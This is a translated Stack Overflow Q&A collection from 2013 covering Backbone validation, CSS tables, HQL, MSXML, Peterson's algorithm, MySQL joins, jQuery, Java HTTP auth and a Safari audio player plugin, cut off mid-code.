var eligible = Backbone.Model.extend({
        validate : function(attrs,options){
            //alert("ldsafh");
            if(attrs.min < attrs.max) {
                return "not eligible for voting";
            }   
        }

    });

        var age = new eligible({
            advice : "You are "
        });

        age.on("invalid", function(model, error) {
            alert("sfndxgj");
            console.log(model.get('advice') + " " + error);
        });

        age.set({
            min : 18,
            max : 100
        }); 
```

为什么这个 age.on 事件不起作用？请在这里帮我....

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T05:33:42.713

作为选项传递`{validate:true}`。

> 默认情况下 validate 在保存之前调用，但如果 {validate:true} 被传递也可以在设置之前调用

[http://backbonejs.org/#Model-validate](http://backbonejs.org/#Model-validate)

**注意**：`invalid`活动仅在升级到 Backbone 1.0 后可用。请参阅[更改日志](http://backbonejs.org/#changelog)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:28:43.503

因为您正在调用[`age.set()`](http://backbonejs.org/#Model-set)而不是为您[`age.save()`](http://backbonejs.org/#Model-save)调用该`validate`方法。

# html - 这个网站是如何在 th 元素之间添加 2px 的边距的？

> ID：15562679
> 
> 赞同：1
> 
> 时间：2013-03-22T04:21:15.593
> 
> 标签：html, css, space, html-table

我一直在查看代码，但仍然无法弄清楚它们是如何实现`th`元素之间的 2px 边距的：

![在此处输入图像描述](../Images/8706cc1efe887f2c864646972ec4c998.png)

这是网站：[http ://eaccoreviewed.com/](http://ecigarettereviewed.com/)

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:23:35.783

这是相关的CSS：

```
table {
    border-collapse: separate;
    border-spacing: 2px;
} 
```

这实际上是浏览器默认样式：

![在此处输入图像描述](../Images/f824322e1893eca1a5d8f3e075d88f10.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:37:48.120

我相信这是导致这些边框的 CSS：

```
table {
    border-collapse: separate;
    border-spacing: 2px;
    -webkit-border-horizontal-spacing: 2px;
    -webkit-border-vertical-spacing: 2px;
} 
```

# linux - qsub 命令如何避免使用特定机器

> ID：15562682
> 
> 赞同：2
> 
> 时间：2013-03-22T04:21:32.070
> 
> 标签：linux, shell, queue, server

我正在使用 qsub 命令将作业提交到服务器上的队列。

由于有些节点比其他节点慢得多，我想避免它们。

是否有标志或参数可以避免我的作业在那些较慢的计算节点上运行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-25T00:26:59.487

试试这个

```
qsub -q <queuename> 
```

或者

```
qsub -l nodes=<nodename> 
```

# java - Group By 和 Sum 结果为 HQL

> ID：15562685
> 
> 赞同：0
> 
> 时间：2013-03-22T04:21:40.190
> 
> 标签：java, hibernate, jakarta-ee, hql

```
CREATE TABLE project(
    Id int auto_increment primary key,
    Name char(50) NOT NULL
)ENGINE = InnoDB;

CREATE TABLE car(
    Id int auto_increment primary key,
    ProjectId int(11) NOT NULL,
    Plate char(10) NOT NULL,
    Latitude varchar(50) DEFAULT '-6.221165',
    Longitude varchar(50) DEFAULT '106.833286',
    LastTemp varchar(20) DEFAULT '0',
    LastSpeed varchar(20) DEFAULT '0',
    LastGap double DEFAULT 0,
    Mileage double DEFAULT 0,
    CONSTRAINT fk_car_project FOREIGN KEY(ProjectId)REFERENCES project(Id) ON UPDATE CASCADE
)ENGINE = InnoDB;

CREATE TABLE car_log(
    Id int auto_increment primary key,
    CarId int NOT NULL,
    Latitude varchar(50),
    Longitude varchar(50),
    Temp varchar(20),
    Speed varchar(20),
    Gap double DEFAULT 0,
    LogDate TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    CONSTRAINT fk_carlog_car FOREIGN KEY(CarId)REFERENCES car(Id) ON UPDATE CASCADE
 ) 
```

表 car 用于保存汽车数据，并具有表项目的外键。表 car_log 用于保存 car 中的每一个动作（日志）。我已经为这个表创建了对象。在这种情况下，我想在一个项目中显示每辆车的摘要（每天的 Gap 总和）。这是我想在项目 1 中选择每辆车的摘要时的查询

```
select CarId, DATE(LogDate) dateOnly, sum(Gap)/1000 KM from car_log where CarId IN (SELECT Id FROM car where ProjectId = 1) group by CarId, dateOnly; 
```

但我很困惑如何在 HQL 中处理这个问题。我尝试创建新对象来处理此问题，但使用它时感到困惑。我想问如何解决这个问题，

```
public class CarLogDate {
    private double km;
    private Date date;
    //constructor & setter getter
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:59:57.363

在您的查询中，只需将表名称替换为实体名称，将表列名称替换为实体属性。

```
List<Object[]> list = 
    select CarId, LogDate dateOnly, sum(Gap)/1000 KM
    from CarLogDate
    where CarId IN
        (SELECT Id FROM car where ProjectId = 1)
    group by CarId, dateOnly; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T06:17:31.857

```
List<Object[]> q = sessionFactory.getCurrentSession().createQuery("SELECT O.car.id AS carId, DATE(O.logDate) AS dateOnly, sum(O.gap)/1000 AS Km from CarLog O " +
            "WHERE carId IN (SELECT id FROM Car c where c.project.id = 1) GROUP BY carId, DATE(O.logDate)").list();
for(Object[] a : q)
    System.out.println(a[0]+" "+a[1]+" "+a[2]); 
```

或者，也许您可​​以使用 Object[] a 作为参数来实例化对象。

# xml - 需要在 QTP 中的 XML 中的特定位置添加一个节点

> ID：15562690
> 
> 赞同：0
> 
> 时间：2013-03-22T04:22:21.513
> 
> 标签：xml, tags, qtp

我需要在特定位置添加一个节点。请检查下面的示例。

```
<root>
<ASNHeader>
<ASNStart>text</ASNStart>
<ASNprop>text_prop</ASNprop>
<ASNDetail>
<ASNAprvr>Mr.X</ASNAprvr>
<ASNAprvrDt>20Mar</ASNAprvrDT>
<ASNAprvrSub>XXX</ASNAprvrsUB>
</ASNDetail>
<ASNSHIP>XYZ</ASNSHIP>
<ASNSRDC>XYZ123</ASNSRDC>
</ASNHeader>
</root> 
```

在这里，我必须复制“ASNDetail”标签并将其粘贴在现有的“ASNDetail”之后和“ASNSHIP”标签之前。我需要根据用户指定的次数复制粘贴。注意：我必须在 QTP 中执行此操作，并且我使用 MSXML2.DomDocument 作为 xml 解析器。任何人都可以提出一种方法。AppendChild 在“ASNSRDC”标签之后复制它，但我不希望以这种方式。这里“ASNHeader”是“root”的孩子。ASNDetail 是“root\ASNHeader”的子级。我在这篇文章中没有正确格式化代码。请调整。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T14:40:11.433

解决方案：

```
Set xmldom = CreateObject("MSXML2.DOMDocument")
xmldom.Load(C:\Sample\test.xml")

'Code to cpoy the tag
Set ndClnDtl = xmldom.selectSingleNode("/root/ASNHeader/ASNDetail").cloneNode(true)

'Location at which you need to cop the xml tags
Set specNode = xmldom.selectSingleNode("/root/ASNHeader/ASNSHIP")

'Rtnode is parent to the location mentioned
Set Rtnode = xmldom.selectSingleNode("/root/ASNHeader")
Rtnode.insertBefore ndClnDtl,specNode

xmldom.Save("C:\Sample\test.xml") 
```

# javascript - flexigrid 列拖动指示器未在 chrome 中正确显示

> ID：15562699
> 
> 赞同：1
> 
> 时间：2013-03-22T04:23:09.153
> 
> 标签：javascript, google-chrome, flexigrid

在 Mozilla 和 IE g.cdpad 返回为 11，但在 Chrome 中返回为 12。所以我的拖动指示器以增量方式显示 1px。

flexigrid.js 第 1034 行

```
 g.cdpad = 0;
        g.cdpad += (isNaN(parseInt($('div', cdcol).css('borderLeftWidth'))) ? 0 : parseInt($('div', cdcol).css('borderLeftWidth')));
        g.cdpad += (isNaN(parseInt($('div', cdcol).css('borderRightWidth'))) ? 0 : parseInt($('div', cdcol).css('borderRightWidth')));
        g.cdpad += (isNaN(parseInt($('div', cdcol).css('paddingLeft'))) ? 0 : parseInt($('div', cdcol).css('paddingLeft')));
        g.cdpad += (isNaN(parseInt($('div', cdcol).css('paddingRight'))) ? 0 : parseInt($('div', cdcol).css('paddingRight')));
        g.cdpad += (isNaN(parseInt($(cdcol).css('borderLeftWidth'))) ? 0 : parseInt($(cdcol).css('borderLeftWidth')));
        g.cdpad += (isNaN(parseInt($(cdcol).css('borderRightWidth'))) ? 0 : parseInt($(cdcol).css('borderRightWidth')));
        g.cdpad += (isNaN(parseInt($(cdcol).css('paddingLeft'))) ? 0 : parseInt($(cdcol).css('paddingLeft')));
        g.cdpad += (isNaN(parseInt($(cdcol).css('paddingRight'))) ? 0 : parseInt($(cdcol).css('paddingRight'))); 
```

任何人都可以解释为什么chrome返回错误的值或者chrome没有正确解析哪个属性。

# java - Java GAE 后端在 3 分钟内重新启动错误 202

> ID：15562706
> 
> 赞同：2
> 
> 时间：2013-03-22T04:23:37.110
> 
> 标签：java, google-app-engine, backend

我使用具有 HR 功能的 Java GAE 我已经配置了从推送队列触发的后端。我正在通过进一步处理获取 5000 个记录。后部在 3 分钟内重新启动，出现错误 202。

*“W 2013-03-22 04:12:30.644 处理此请求的进程遇到问题，导致它退出。这可能会导致新进程用于对您的应用程序的下一个请求。（错误代码 202)"*

我请求 Google 的某个人做出回应。

即使队列可以运行 10 分钟，但没有一个队列运行时间超过 3 分钟。

我不知道是否有办法配置这个。

让我知道需要什么细节。

谢谢

-DJ

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-12T00:58:34.527

我很确定实例内存不足。如果您使用 appstats 来分析您的通话，请尝试禁用它。或者您可以尝试选择更大的实例大小。

# algorithm - 彼得森算法

> ID：15562707
> 
> 赞同：1
> 
> 时间：2013-03-22T04:23:39.670
> 
> 标签：algorithm, parallel-processing, operating-system

在经典的彼得森算法中，在进入临界区之前检查 2 个标志 flag1 和 flag2 以及 turn 变量。如果我先检查 turn 然后检查标志，这会起作用吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T08:34:00.427

是的，如果您先检查`turn`然后检查`flag[0]`or`flag[1]`在`while()`.

原因是只有当两个条件都为真时才会执行忙等待。

作为证明，我编写了一个小型 C 程序来模拟两个进程，并在它们之间进行随机切换。

对于关键部分，我在进程 0 中使用了这段代码：

```
global ^= 0x5555;
global ^= 0x5555;
global++; 
```

这在过程1中：

```
global ^= 0xAAAA;
global ^= 0xAAAA;
global++; 
```

两个进程各执行此部分 1000 次。如果两者的关键部分之间存在竞争条件，`global`则可能与模拟结束时的 2000 年不同。

代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

typedef enum
{
  InstrNop,
  InstrHalt,
  InstrSetVarNum,
  InstrJumpVarZero,
  InstrJumpVarNonzero,
  InstrJump,
  InstrIncVar,
  InstrDecVar,
  InstrXorVarNum,
} tInstr;

int ExecuteInstruction(unsigned* Vars, const unsigned* Program, unsigned* Position)
{
  switch (Program[*Position])
  {
  default:
  case InstrHalt:
    return 0;

  case InstrNop:
    (*Position)++;
    break;

  case InstrSetVarNum:
    Vars[Program[*Position + 1]] = Program[*Position + 2];
    (*Position) += 3;
    break;

  case InstrXorVarNum:
    Vars[Program[*Position + 1]] ^= Program[*Position + 2];
    (*Position) += 3;
    break;

  case InstrJumpVarZero:
    if (Vars[Program[*Position + 1]] == 0)
      (*Position) = Program[*Position + 2];
    else
      (*Position) += 3;
    break;

  case InstrJumpVarNonzero:
    if (Vars[Program[*Position + 1]] != 0)
      (*Position) = Program[*Position + 2];
    else
      (*Position) += 3;
    break;

  case InstrJump:
    (*Position) = Program[*Position + 1];
    break;

  case InstrIncVar:
    Vars[Program[*Position + 1]]++;
    (*Position) += 2;
    break;

  case InstrDecVar:
    Vars[Program[*Position + 1]]--;
    (*Position) += 2;
    break;
  }

  return 1;
}

typedef enum
{
  VarGlobal,

  VarCnt0,
  VarCnt1,

  VarFlag0,
  VarFlag1,
  VarTurn,

  VarIdxMax
} tVarIdx;

unsigned Vars[VarIdxMax];

#define USE_PETERSON 01
#define SWAP_CHECKS 01

const unsigned Program0[] =
{
  // cnt0 = 1000;
  InstrSetVarNum, VarCnt0, 1000,

// 3:
#if USE_PETERSON
  // flag[0] = 1;
  InstrSetVarNum, VarFlag0, 1,
  // turn = 1;
  InstrSetVarNum, VarTurn, 1,
// 9:
  // while (flag[1] == 1 && turn == 1) {}
#if SWAP_CHECKS
  InstrJumpVarZero, VarTurn, 17,
  InstrJumpVarZero, VarFlag1, 17,
#else
  InstrJumpVarZero, VarFlag1, 17,
  InstrJumpVarZero, VarTurn, 17,
#endif
  InstrJump, 9,
// 17:
#endif

// Critical section starts
  // global ^= 0x5555;
  // global ^= 0x5555;
  // global++;
  InstrXorVarNum, VarGlobal, 0x5555,
  InstrXorVarNum, VarGlobal, 0x5555,
  InstrIncVar, VarGlobal,
// Critical section ends

#if USE_PETERSON
  // flag[0] = 0;
  InstrSetVarNum, VarFlag0, 0,
#endif

  // cnt0--;
  InstrDecVar, VarCnt0,
  // if (cnt0 != 0) goto 3;
  InstrJumpVarNonzero, VarCnt0, 3,

  // end
  InstrHalt
};

const unsigned Program1[] =
{
  // cnt1 = 1000;
  InstrSetVarNum, VarCnt1, 1000,

// 3:
#if USE_PETERSON
  // flag[1] = 1;
  InstrSetVarNum, VarFlag1, 1,
  // turn = 0;
  InstrSetVarNum, VarTurn, 0,
// 9:
  // while (flag[0] == 1 && turn == 0) {}
#if SWAP_CHECKS
  InstrJumpVarNonzero, VarTurn, 17,
  InstrJumpVarZero, VarFlag0, 17,
#else
  InstrJumpVarZero, VarFlag0, 17,
  InstrJumpVarNonzero, VarTurn, 17,
#endif
  InstrJump, 9,
// 17:
#endif

// Critical section starts
  // global ^= 0xAAAA;
  // global ^= 0xAAAA;
  // global++;
  InstrXorVarNum, VarGlobal, 0xAAAA,
  InstrXorVarNum, VarGlobal, 0xAAAA,
  InstrIncVar, VarGlobal,
// Critical section ends

#if USE_PETERSON
  // flag[1] = 0;
  InstrSetVarNum, VarFlag1, 0,
#endif

  // cnt1--;
  InstrDecVar, VarCnt1,
  // if (cnt1 != 0) goto 3;
  InstrJumpVarNonzero, VarCnt1, 3,

  // end
  InstrHalt
};

void Simulate(void)
{
  unsigned pos0 = 0, pos1 = 0;

  while (Program0[pos0] != InstrHalt ||
         Program1[pos1] != InstrHalt)
  {
    int cnt;

    cnt = rand() % 50;
    while (cnt--)
      if (!ExecuteInstruction(Vars, Program0, &pos0))
        break;

    cnt = rand() % 50;
    while (cnt--)
      if (!ExecuteInstruction(Vars, Program1, &pos1))
        break;
  }
}

int main(void)
{
  srand(time(NULL));
  Simulate();
  printf("VarGlobal = %u\n", Vars[VarGlobal]);
  return 0;
} 
```

输出（[ideone](http://ideone.com/IfoYFa)）：

```
VarGlobal = 2000 
```

现在，检查顺序与[Wikipedia](http://en.wikipedia.org/wiki/Peterson%27s_algorithm)中相同的程序，我将其定义`SWAP_CHECKS`为 0：输出（[ideone](http://ideone.com/45NvXQ)）：

```
VarGlobal = 2000 
```

最后，为了表明当彼得森算法被禁用时存在竞争条件，我定义`USE_PETERSON`为 0：输出（[ideone](http://ideone.com/g8LHp2)）：

```
VarGlobal = 1610 
```

# php - mysql 按方法分组

> ID：15562708
> 
> 赞同：0
> 
> 时间：2013-03-22T04:23:54.477
> 
> 标签：php, mysql

采购表：

```
========================
id|username|product|price|
01|Desmond |tv     |$40  |
02|Desmond |watch  |$20  |
03|Desmond |ring   |$30  |
04|Desmond |laptop |$40  |
======================== 
```

产品表：

```
============================
id|product|type |promotion_ID|
01|tv     |big  |001         |
02|watch  |small|002         |
03|ring   |small|002         |
04|laptop |big  |001         |
============================ 
```

促销编号：

```
==============================
id|promotion_ID|promotion_name|
01|001         |mid-year      |
02|002         |end-year      |
============================== 
```

我想基于 while 循环方法显示采购表的结果，以显示来自 mysql 的所有信息，这没问题，但我想根据采购表的促销 ID/促销名称对它们进行分组。我可以知道，我该怎么做？

例如显示结果：

年中

```
=======================
username|product|price|
Desmond |tv     |$40  |
Desmond |laptop |$40  |
======================= 
```

年终

```
=======================
username|product|price|
Desmond |watch  |$20  |
Desmond |ring   |$30  |
======================= 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:32:02.887

您是否只是在寻找`ORDER BY`和`JOIN`：

```
SELECT promotion_name, 
    username, 
    p.product,
    price
FROM Purchase P
    JOIN Product PR ON P.Product=PR.Product
    JOIN Promotion PO ON PR.Promotion_Id=PO.Promotion_Id
ORDER BY promotion_name, p.product 
```

关于您的数据库，我不建议将 Product 存储在 Purchase 表中——您应该存储 Product_Id 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:35:45.800

```
This may help you..

Select username,product,price from Purchase
Join Product on Product.product = Purchase.product 
Join Promotion On promotion.promotion_ID  = Product.promotion_ID
where promotion_name = 'mid-year' // pass your argument
Order by Product.product 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:38:12.137

尝试

```
SELECT pur.username, pur.product, pur.price
FROM tbl_purchase pur 
INNER JOIN tbl_product pro USING(product)
INNER JOIN tbl_promotion prm USING(promotion_ID)
ORDER BY prm.promotion_name 
```

**注意：**您没有引用所有表的主键，所以在列`product`和`promotion_id`所有表上建立索引

# javascript - 动画随机数未运行

> ID：15562710
> 
> 赞同：0
> 
> 时间：2013-03-22T04:24:21.630
> 
> 标签：javascript, jquery, html

我 [在 Jquery 中使用了 Random Number Effect](https://stackoverflow.com/questions/8363916/random-number-effect-in-jquery/15562546#15562546)中的 post 之类的代码.. 和结果[http://jsfiddle.net/ZDsMa/94/](http://jsfiddle.net/ZDsMa/94/) ...

现在我在一个文件 php( `index.php`) 中编写完整的代码 html 和 jquery 并放在我的服务器上......

```
<html>
<title>Randomize Number</title>
<head>
<style type="text/css">
#output {
    margin: 20px;
    padding: 20px;
    background: gray;
    border-radius: 10px;
    font-size: 80px;
    width: 160px;
    color: red;
}
</style>

<script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script>
<script>
var output, started, duration, desired;
// Constants
duration = 5000;
desired = '50';

// Initial setup
output = $('#output');
started = new Date().getTime();

// Animate!
animationTimer = setInterval(function() {
    // If the value is what we want, stop animating
    // or if the duration has been exceeded, stop animating
    if (output.text().trim() === desired || new Date().getTime() - started > duration) {
        console.log('animating');
        // Generate a random string to use for the next animation step
        output.text('' + Math.floor(Math.random() * 990)

        );

    } else {
        console.log('animating');
        // Generate a random string to use for the next animation step
        output.text('' + Math.floor(Math.random() * 990)

        );
    }
}, 1000);

</script>
</head>
<body>
<div id="output">-</div>                    
</body>
</html> 
```

动画随机数未显示（jscript 未运行，仅带有“-”字符/css 的框）

我的代码有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:01:04.973

You just need to make sure your code gets executed after the page is rendered. Try wrapping it with:

```
...
<script>
$( function () {
    var output, started, duration, desired;
    // Constants
    duration = 5000;

    ...

    }, 1000);
});
</script>
... 
```

You can find more info here [jQuery.ready()](http://api.jquery.com/ready/ "jQuery.ready()").

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T05:05:50.307

嗨使用这个javascript代码它工作

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>
$(document).ready(function() {
var output, started, duration, desired;
// Constants
duration = 5000;
desired = '50';

// Initial setup
output = $('#output');
started = new Date().getTime();

// Animate!
animationTimer = setInterval(function() {
    // If the value is what we want, stop animating
    // or if the duration has been exceeded, stop animating
    if (output.text().trim() === desired || new Date().getTime() - started > duration) {
        console.log('animating');
        // Generate a random string to use for the next animation step
        output.text('' + Math.floor(Math.random() * 990)

        );

    } else {
        console.log('animating');
        // Generate a random string to use for the next animation step
        output.text('' + Math.floor(Math.random() * 990)

        );
    }
}, 1000);
}) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:30:25.573

您需要将与 DOM 交互的代码包装在`$(document).ready()`回调中：

```
$(document).ready(function() {
    ...
}) 
```

# java - 如何为restful请求添加参数？

> ID：15562717
> 
> 赞同：1
> 
> 时间：2013-03-22T04:25:00.480
> 
> 标签：java, rest, jakarta-ee, restful-url

我正在使用以下代码发送 REST 请求，请求失败（401 错误），因为它需要用户名和密码。

如何将它们添加到网址？即使我在浏览器中复制 url 并将用户名和密码添加到它的末尾，浏览器也会弹出登录页面，所以我想在代码中我应该添加用户名和密码参数但是如何？

```
 URL url = new URL("www.example.com/user?ID=1234");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
                if (conn.getResponseCode() != HttpURLConnection.HTTP_CREATED) {
            throw new RuntimeException("Failed : HTTP error code : "
                + conn.getResponseCode());
        } 
```

我在代码中添加了以下内容，但仍然遇到 401 错误。

```
 conn.setRequestProperty("username", "myusername");
             conn.setRequestProperty("password", "mypassword"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:31:27.843

尝试这个：

```
String params="username=myusername&password=mypassword";
conn.getOutputStream().write(params.getBytes());
conn.getOutputStream().flush();
conn.getOutputStream().close(); 
```

* * *

或者您可能需要对参数进行编码：

```
DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

String postContent = URLEncoder.encode("username", "UTF-8") + "=" + 
                     URLEncoder.encode(myusername, "UTF-8") + "&" + 
                     URLEncoder.encode("password", "UTF-8") + "=" + 
                     URLEncoder.encode(mypassword, "UTF-8") ;

dos.write(postContent.getBytes());
dos.flush();
dos.close(); 
```

* * *

关于[基本授权](http://docs.oracle.com/javase/6/docs/technotes/guides/net/http-auth.html)

```
String userPassword = username + ":" + password;
String encoding = new sun.misc.BASE64Encoder().encode(userPassword.getBytes());
URLConnection uc = url.openConnection();
uc.setRequestProperty("Authorization", "Basic " + encoding);
uc.connect(); 
```

# java - 刷新android上的运行时

> ID：15562720
> 
> 赞同：1
> 
> 时间：2013-03-22T04:25:23.993
> 
> 标签：java, android

有什么方法可以刷新通过调​​用 Runtime.getRuntime() 获得的 Runtime 对象？

我通过执行 su 命令使用它来检查我的应用程序的 root 权限。似乎即使我使用某些应用程序（我使用 [了这个](https://play.google.com/store/apps/details?id=com.zachspong.temprootremover)）暂时取消root/root设备，Runtime.getRuntime（）也不知道它。要让它知道 su 命令可用/不可用是重新启动应用程序。

# dynamics-crm-2011 - 如何在 ms 动态 CRM 的自定义 xml 中添加 CustomAction Id

> ID：15562721
> 
> 赞同：2
> 
> 时间：2013-03-22T04:25:26.053
> 
> 标签：dynamics-crm-2011, dynamics-crm, crm, dynamics-crm-4, dynamics-crm-online

我是 MS Dynamics CRM 2011 的初学者，现在需要在功能区中添加示例按钮。现在我在 Customization.xml 文件的 CustomActions 下面添加了 CustomAction Id..，但是在导入 CRM 时，它显示错误。

```
<ImportExportXml xmlns:xsi="http://www.xxxxxxxxxxxxxxx">
.......
.....
<CustomActions >
<CustomAction Id=”Mscrm.ISV.MyCustomTabAction” Location=”Mscrm.Tabs._children” Sequence=”1000?>
       .....
....
      </CustomAction>
    </CustomActions >
<Templates>
  <RibbonTemplates Id="Mscrm.Templates"></RibbonTemplates>
</Templates>
      <CommandDefinitions>
      <CommandDefinition Id=”Mscrm.ISV.MyCustomTabCommand”&gt;
       ......
      </CommandDefinition>
      </CommandDefinitions>
<RuleDefinitions>
  <TabDisplayRules />
  <DisplayRules >
    <DisplayRule Id=”Mscrm.ISV.MyCustomTabAction”&gt;
       <OrRule>
          <Or>
            <CrmClientTypeRule Type=”Web” />   
          </Or>
        </OrRule>
       </DisplayRule>
</DisplayRules >
 ....... 
```

但是当我在 IE 中打开这个 xml 时，它显示错误，“在文本内容中发现了一个无效字符。错误处理资源 'file:///C:/Users/Vishnukumars/Desktop/CRM/custom...

```
<CustomAction Id=" 
```

有什么错误

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T07:53:38.257

看起来您在以问号结尾的自定义操作中有错误。

```
Sequence=”1000? 
```

应该

```
Sequence=1000" 
```

我建议在修改功能区时使用工具，例如[http://crmvisualribbonedit.codeplex.com/](http://crmvisualribbonedit.codeplex.com/)

# jquery - Safari 中 HTML5 音频音量的问题

> ID：15562724
> 
> 赞同：3
> 
> 时间：2013-03-22T04:25:52.917
> 
> 标签：jquery, html, audio, safari

我注意到**Safari 中的音频播放音量不是 100%，即使我将分配的控件设置为“1”。**

是否有其他人可以这样做，或者这可能是脚本中的问题？

使用此控件（如下所示），音频在 Firefox 中播放率为 100%。

**更新：**显然我用于音量的控件在 Safari 中无法识别（见下文），所以我现在正在寻找一种方法，在 Safari 中使用下面的这个播放器以 100% 的音量播放音频。

根据 Safari 开发者库，阅读量总是返回 1，这是我设置播放器的值；但是，Safari 中的音量略低于其他浏览器。

问题可能出在我的脚本中，还是仅仅是 Safari 的问题？

**另外，**我注意到更改音量参数会减弱 Safari 中的音量，但 1 不等于 100%；因此，它确实有一些效果，但仍然存在问题。

**这是我的 HTML：**

```
<head>
<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
<script src="src/jquery.ubaplayer.js"></script>
<script>
jQuery(document).ready(function() { 
   jQuery.noConflict();
   jQuery(function(){
            jQuery("#ubaPlayer").ubaPlayer({
            codecs: [{name:"MP3", codec: 'audio/mpeg;'}]
            });

    });
    jQuery('a[rel=vidbox]').click(function () {

        if (jQuery("#ubaPlayer").ubaPlayer("playing") === true) {
            jQuery("#ubaPlayer").ubaPlayer("pause");
            }
        return false;
    });
})
</script>
</head>

<body>
<div id="ubaPlayer"></div>
    <ul class="controls">
        <li><a class="audioButton" href="mp3/dontthinktwice.mp3">
        Don't Think Twice (Bob Dylan)</a></li>
        <li><a class="audioButton" href="mp3/livingforthecity.mp3">
        Living for the City (Stevie Wonder)</a></li>
    </ul>
</body> 
```

**音频播放器 Javascript：**

```
(function($) {
var defaults = {
    audioButtonClass: "audioButton",
    autoPlay: null,
    codecs: [{
        name: "OGG",
        codec: 'audio/ogg; codecs="vorbis"'
    }, {
        name: "MP3",
        codec: 'audio/mpeg'
    }],
    continuous: false,
    extension: null,
    flashAudioPlayerPath: "libs/swf/player.swf",
    flashExtension: ".mp3",
    flashObjectID: "audioPlayer",
    loadingClass: "loading",
    loop: false,
    playerContainer: "player",
    playingClass: "playing",
    swfobjectPath: "libs/swfobject/swfobject.js",
    volume: 1
},
    currentTrack, isPlaying = false,
    isFlash = false,
    audio, $buttons, $tgt, $el, playTrack, resumeTrack, pauseTrack, methods = {
        play: function(element) {
            $tgt = element;
            currentTrack = _methods.getFileNameWithoutExtension($tgt.attr("href"));
            isPlaying = true;
            $tgt.addClass(defaults.loadingClass);
            $buttons.removeClass(defaults.playingClass);

            if (isFlash) {
                if (audio) {
                    _methods.removeListeners(window);
                }
                audio = document.getElementById(defaults.flashObjectID);
                _methods.addListeners(window);
                audio.playFlash(currentTrack + defaults.extension);
            } else {
                if (audio) {
                    audio.pause();
                    _methods.removeListeners(audio);
                }
                audio = new Audio("");
                _methods.addListeners(audio);
                audio.id = "audio";
                audio.loop = defaults.loop ? "loop" : "";
                audio.volume = defaults.volume;
                audio.src = currentTrack + defaults.extension;
                audio.play();
            }
        },

        pause: function() {
            if (isFlash) {
                audio.pauseFlash();
            } else {
                audio.pause();
            }

            $tgt.removeClass(defaults.playingClass);
            isPlaying = false;
        },

        resume: function() {
            if (isFlash) {
                audio.playFlash();
            } else {
                audio.play();
            }
            $tgt.addClass(defaults.playingClass);
            isPlaying = true;
        },

        playing: function() {
            return isPlaying;
        }
    },

    _methods = {
        init: function(options) {
            var types;

            //set defaults
            $.extend(defaults, options);
            $el = this;

            //listen for clicks on the controls
            $(".controls").bind("click", function(event) {
                _methods.updateTrackState(event);
                return false;
            });
            $buttons = $("." + defaults.audioButtonClass);

            types = defaults.codecs;
            for (var i = 0, ilen = types.length; i < ilen; i++) {
                var type = types[i];
                if (_methods.canPlay(type)) {
                    defaults.extension = [".", type.name.toLowerCase()].join("");
                    break;
                }
            }

            if (!defaults.extension || isFlash) {
                isFlash = true;
                defaults.extension = defaults.flashExtension;
            }

            if (isFlash) {
                $el.html("<div id='" + defaults.playerContainer + "'/>");
                $.getScript(defaults.swfobjectPath, function() {
                    swfobject.embedSWF(defaults.flashAudioPlayerPath, defaults.playerContainer, "0", "0", "9.0.0", "swf/expressInstall.swf", false, false, {
                        id: defaults.flashObjectID
                    }, _methods.swfLoaded);
                });
            } else {
                if (defaults.autoPlay) {
                    methods.play(defaults.autoPlay);
                }
            }
        },

        updateTrackState: function(evt) {
            $tgt = $(evt.target);
            if (!$tgt.hasClass("audioButton")) {
                return;
            }
            if (!audio || (audio && currentTrack !== _methods.getFileNameWithoutExtension($tgt.attr("href")))) {
                methods.play($tgt);
            } else if (!isPlaying) {
                methods.resume();
            } else {
                methods.pause();
            }
        },

        addListeners: function(elem) {
            $(elem).bind({
                "canplay": _methods.onLoaded,
                "error": _methods.onError,
                "ended": _methods.onEnded
            });
        },

        removeListeners: function(elem) {
            $(elem).unbind({
                "canplay": _methods.onLoaded,
                "error": _methods.onError,
                "ended": _methods.onEnded
            });
        },

        onLoaded: function() {
            $buttons.removeClass(defaults.loadingClass);
            $tgt.addClass(defaults.playingClass);

            audio.play();
        },

        onError: function() {
            $buttons.removeClass(defaults.loadingClass);
            if (isFlash) {
                _methods.removeListeners(window);
            } else {
                _methods.removeListeners(audio);
            }
        },

        onEnded: function() {
            isPlaying = false;
            $tgt.removeClass(defaults.playingClass);
            currentTrack = "";
            if (isFlash) {
                _methods.removeListeners(window);
            } else {
                _methods.removeListeners(audio);
            }

            if (defaults.continuous) {
                var $next = $tgt.next().length ? $tgt.next() : $(defaults.audioButtonClass).eq(0);
                methods.play($next);
            }

        },

        canPlay: function(type) {
            if (!document.createElement("audio").canPlayType) {
                return false;
            } else {
                return document.createElement("audio").canPlayType(type.codec).match(/maybe|probably/i) ? true : false;
            }
        },

        swfLoaded: function() {
            if (defaults.autoPlay) {
                setTimeout(function() {
